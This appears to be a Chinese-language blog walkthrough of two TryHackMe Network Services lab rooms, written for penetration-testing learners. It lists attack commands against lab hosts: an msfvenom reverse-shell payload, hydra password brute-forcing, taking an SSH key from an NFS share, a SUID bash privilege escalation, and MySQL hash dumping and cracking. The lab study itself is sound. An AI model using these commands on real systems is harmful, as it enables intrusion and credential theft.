---
layout: post
title:  "TryHackme - Network Services Room Walkthrough"
date:   12 June 2025
categories: Demo
tags: Cybersecurity
---
<html>
<body>
<div markdown="block" style="margin-top: 10px">
    
### Intro
本篇紀錄自己在TryHackMe中的兩個Network Services Room的解題歷程(非常粗糙)，若有需要可到以下查看題目：
- [Network Services 1](https://tryhackme.com/room/networkservices)
- [Network Services 2](https://tryhackme.com/room/networkservices2)

  
### Room: Network Services 1
- 目標主機: `10.10.4.5`
- 攻擊主機: `10.4.9.189`  
  
#### -SMB
1. nmap先找出有沒有開smb
2. 用enum4linux找出有沒有感興趣的目錄
3. 用smbclient測試有沒有打開anonymous：`smbclient //10.10.4.5/secret -U Anonymous -p 445`
4. 如果可以進到FS，先看有支援哪些指令：`help` 然後再接下來的exploit

#### -Telnet
1. nmap先找出有沒有telnet（沒有明顯表示）

2. nc ip port連接/或telnet ip port

3. 用msfvenom創造reverse shell

   - 首先不確定哪些有的話，可以先用`msfvenom -l payloads | grep -E "reverse.\*netcat|netcat.\*reverse"`查找哪有有關的模組

     ```bash
     └─$ msfvenom -l payloads | grep -E "reverse.*netcat|netcat.*reverse"
         cmd/unix/reverse_netcat                                            Creates an interactive shell via netcat
         cmd/unix/reverse_netcat_gaping                                     Creates an interactive shell via netcat
     ```

   - 然後用 `mefvenom -p cmd/unix/reverse_netcat --list-options`來查找模組有哪些參數可以設置

     ```bash
     └─$ msfvenom -p cmd/unix/reverse_netcat --list-options              
     Options for payload/cmd/unix/reverse_netcat:
     =========================
     
     
            Name: Unix Command Shell, Reverse TCP (via netcat)
          Module: payload/cmd/unix/reverse_netcat
        Platform: Unix
            Arch: cmd
     Needs Admin: No
      Total size: 78
            Rank: Normal
     
     Provided by:
         m-1-k-3
         egypt <egypt@metasploit.com>
         juan vazquez <juan.vazquez@metasploit.com>
     
     Basic options:
     Name   Current Setting  Required  Description
     ----   ---------------  --------  -----------
     LHOST                   yes       The listen address (an interface may be specified)
     LPORT  4444             yes       The listen port
     
     Description:
         Creates an interactive shell via netcat
     
     
     
     Advanced options for payload/cmd/unix/reverse_netcat:
     =========================
     
         Name                        Current Setting  Required  Description
         ----                        ---------------  --------  -----------
         AutoRunScript                                no        A script to run automatically on session creation.
         AutoVerifySession           true             yes       Automatically verify and drop invalid sessions
         CommandShellCleanupCommand                   no        A command to run before the session is closed
         InitialAutoRunScript                         no        An initial script to run on session creation (before AutoRunScript)
         NetcatPath                  nc               yes       The path to the Netcat executable
         ReverseAllowProxy           false            yes       Allow reverse tcp even with Proxies specified. Connect back will NOT go t
                                                                hrough proxy but directly to LHOST
         ReverseListenerBindAddress                   no        The specific IP address to bind to on the local system
         ReverseListenerBindPort                      no        The port to bind to on the local system if different from LPORT
         ReverseListenerComm                          no        The specific communication channel to use for this listener
         ReverseListenerThreaded     false            yes       Handle every connection in a new thread (experimental)
         ShellPath                   /bin/sh          yes       The path to the shell to execute
         StagerRetryCount            10               no        The number of times the stager should retry if the first connect fails
         StagerRetryWait             5                no        Number of seconds to wait for the stager between reconnect attempts
         VERBOSE                     false            no        Enable detailed status messages
         WORKSPACE                                    no        Specify the workspace for this module
     
     Evasion options for payload/cmd/unix/reverse_netcat:
     =========================
     ```

   - 最後 `msfvenom -p cmd/unix/reverse_netcat lhost=10.4.9.189 lport=4444 R`，其中R代表輸出raw format的code
  
  
#### -FTP
- nmap找出port和服務
- 嘗試`ftp 10.10.4.5`並且username=anonymous, password=空
- `help`查看有那哪些指令
- 之後用`hydra`爆破密碼; `hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt 10.10.4.5 ftp`
  - -t 4: threads
  - -l mike: LOGIN name
  - -P /path/to/wordlist
  - IP
  - protocol
  

### Room: Network Service 2
#### -NFS
- nmap找出port和服務
- `showmount -e 10.10.165.251 `找出有哪些visible share => 找到 `/home`
- 把這個visible share folder掛載到自己的directory上: `sudo mount -t nfs 10.10.165.251:home /tmp/mount/ -nolock`
- (幸運)找到.ssh/文件夾並找到id_rsa可以用當前用戶ssh到NFS Server
- 之後的想法就是在自己的主機上設置一個bash executable並且owner是root且有設置SUID；這樣的話在NFS server上就可以使用這個bash executable來提權:
  - 在自己的主機上複製一份/bin/bash並且將其權限和擁有者設置好: `cp /bin/bash . && sudo chown root bash && chmod +s bash`
  - 放到掛載的文件夾內
  - (幸運)ssh到NFS Server並執行`./bash -p` (-p是保留擁有者權限，這樣才會用root身分和SUID執行，如果不加可能會無效)  

#### -SMTP
- nmap掃描發現有開smtp & ssh

- 用metasploit的`smtp_version`和`smtp_enum`分別得出mail server type/version、username

  ```
  msfconsole														#進入metasploit交互模式/命令模式msfvenom
  help
  use auxiliary/scanner/smtp/smtp_enum	#使用模組
  options																#或show info
  set RHOSTS 10.10.77.44								#設置payloads
  exploit																#或run	
  ```

- 那麼通過第一步nmap的掃描得知目標伺服器還有開放ssh，那就拿smtp_enum得出的username結合hydra去做爆破

- ssh到目標伺服器  
  

#### -MYSQL
- nmap掃描發現有開ssh & mysql
- 並且從之前的動作中獲得一組credentials "root:password"
- 嘗試使用這組credentials連到伺服器，發現不行
- 那麼猜測這組credentials用於mysql登入
- 使用metasploit來弄mysql: `mysql_sql`, `mysql_schemadump`, `mysql_hashdump`
- 最後通過`mysql_hashdump`得到的hash用john the reaper破解: `john hash.txt`
- 然後想到前面有開ssh，而且找到的這個用戶可能會密碼重用(mysql和ssh帳密相同)，因此嘗試ssh登入
- 成功登入
  
  
### 總結
通過這一連串下來讓我認識並加深對整個exploit的過程，並且熟悉各個協議有可能的漏洞。  
  
還通過這個練習很多相關工具如:`nmap`, `enum4linux`, `smbclient`, `ftp`, `hydra`, `netcat`, `showmount`/`mount`, `metasploit`, `john` 等等，非常適合剛開始學習滲透測試的人練習。  
  
謝謝各位看到這邊，如有任何疑問或文章有任何錯漏，歡迎來信與我討論，謝謝！
  

## 學習資料
1. [TryHackMe - Network Services 1](https://tryhackme.com/room/networkservices)
2. [TryHackMe - Network Services 2](https://tryhackme.com/room/networkservices2)
3. [Metasploit Official Document](https://docs.metasploit.com/)

</div>
</body>
</html>
